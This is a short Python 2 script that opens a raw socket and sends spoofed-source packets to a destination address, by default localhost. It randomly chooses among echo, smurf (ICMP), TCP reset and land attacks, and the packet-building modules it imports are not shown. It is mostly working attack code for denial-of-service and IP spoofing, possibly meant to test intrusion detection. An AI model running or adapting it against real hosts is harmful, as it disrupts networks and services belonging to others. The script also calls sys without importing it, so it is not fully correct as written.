import echo_test
import icmp_test 
import rst_test
import land_test
import random
import header
import socket

IP_RANDOM = True
SRC_PORT_RANDOM = True
ip_dest = '127.0.0.1'
ip_source = '127.0.0.1'
SEND_TIMES = 5

def send_pack():
    echo_test.IP_RANDOM = IP_RANDOM
    echo_test.ip_dest = ip_dest
    icmp_test.ip_dest = ip_dest
    rst_test.ip_dest = ip_dest
    land_test.ip_dest = ip_dest
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error , msg:
        print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
        sys.exit()
    ip_pool = ['10.3.152.132','32.1.21.90','231.213.20.12','98.123.21.54']
    for _ in range(4):
        ip_pool.append(header.ip_random())
    for _ in range(SEND_TIMES):
        roll = random.randint(0,3)
        ip_source = ip_pool[random.randint(0,len(ip_pool)-1)]
        if roll == 0:
            print 'echo attack from',ip_source
            pack = echo_test.udp_pack(ip_source)
        elif roll == 1:
            print 'smuf attack from',ip_source
            pack = icmp_test.icmp_pack(ip_source)
        elif roll == 2:
            print 'rst attack from',ip_source
            pack = rst_test.rst_pack(ip_source)
        elif roll == 3:
            print 'land attack from',ip_source
            pack = land_test.land_pack(ip_source)
        s.sendto(pack, (ip_dest, 0))
    
send_pack()